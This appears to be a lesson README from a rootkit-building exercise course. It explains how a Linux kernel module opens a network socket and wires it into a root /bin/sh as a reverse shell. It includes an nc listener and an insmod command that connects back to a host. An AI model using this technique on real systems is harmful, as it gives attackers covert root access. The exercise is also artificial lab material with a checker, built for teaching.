# Redirect shell I/O to the network

Combine L14 (kernel socket) and L16 (usermodehelper) to build a reverse shell.
The key trick: convert the kernel socket into a `struct file`, then install it
as file descriptors 0, 1, and 2 in the spawned shell process.
Everything the shell reads comes from the network; everything it writes goes
back over the network.

## Mechanism

```
sock_create_kern + kernel_connect     (from L14)
  |
  v
sock_alloc_file(sock, 0, NULL)        Convert socket to struct file
  |
  v
In UMH init callback:
  fd = get_unused_fd_flags(0)         Get free fd slot
  fd_install(fd, get_file(sock_file)) Install socket file as fd 0, 1, 2
  |
  v
/bin/sh                               Shell reads/writes through the socket
```

A mutex and busy flag protect the shell slot so only one shell runs at a time.

## Your task

Edit `main.c`.
Complete:

1. `rk_umh_init`: escalate to root, then install the socket file as file
   descriptors 0, 1, and 2 using `get_unused_fd_flags` and `fd_install`.
2. `rk_init`: create and connect a kernel socket, convert it to a file with
   `sock_alloc_file`, set up the shell with `call_usermodehelper_setup/exec`.

Module parameters `host` and `port` control the target.

## Demo

On the host:

```
host$ nc -l 4444
```

In the VM:

```
vm$ insmod rklings.ko host=10.0.2.2 port=4444
```

On the host, the `nc` session becomes a root shell:

```
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Verification

```
./rklings check
```
